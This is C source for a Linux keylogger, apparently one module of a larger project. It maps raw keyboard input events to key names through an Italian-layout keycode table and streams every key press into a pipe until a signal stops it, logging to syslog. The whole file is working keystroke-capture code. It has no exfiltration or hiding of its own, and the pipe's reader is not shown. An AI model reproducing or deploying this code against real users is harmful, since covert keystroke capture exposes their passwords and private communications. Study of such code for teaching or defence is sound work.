#include "keylogger.h"

#define NUM_EVENTS 128
#define NUM_KEYCODES 71

const char *keycodes[] = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "APOSTROPHE",
        "L_ACCENT_I",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "L_ACCENT_E",
        "PLUS",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "L_ACCENT_O",
        "L_ACCENT_A",
        "L_ACCENT_U",
        "LEFTSHIFT",
        "LESS_THAN",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "MINUS",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};

int loop = 1;

void keylogger_handler(int sig) {
    loop = 0;
    syslog(LOG_INFO, "Keylogger stopped by signal %s", strsignal(sig));
}

void keylogger(int keyboard, int write_pipe) {
    int eventSize = sizeof(struct input_event);
    ssize_t bytesRead;
    struct input_event events[NUM_EVENTS];

    struct sigaction int_handler;
    int_handler.sa_handler = &keylogger_handler;
    sigaction(SIGINT, &int_handler, NULL);
    sigaction(SIGPIPE, &int_handler, NULL);

    while (loop) {
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for (int i = 0; i < (bytesRead / eventSize); i++) {
            if (events[i].type == EV_KEY && events[i].value == 1) {
                if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                    const char *toWrite = keycodes[events[i].code];
                    write(write_pipe, toWrite, strlen(toWrite) + 1);
                } else {
                    write(write_pipe, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                }
                write(write_pipe, "  ", sizeof("  "));
            }
        }
    }

    syslog(LOG_INFO, "Keylogger finished, closing write end of pipe");
    close(write_pipe);
}
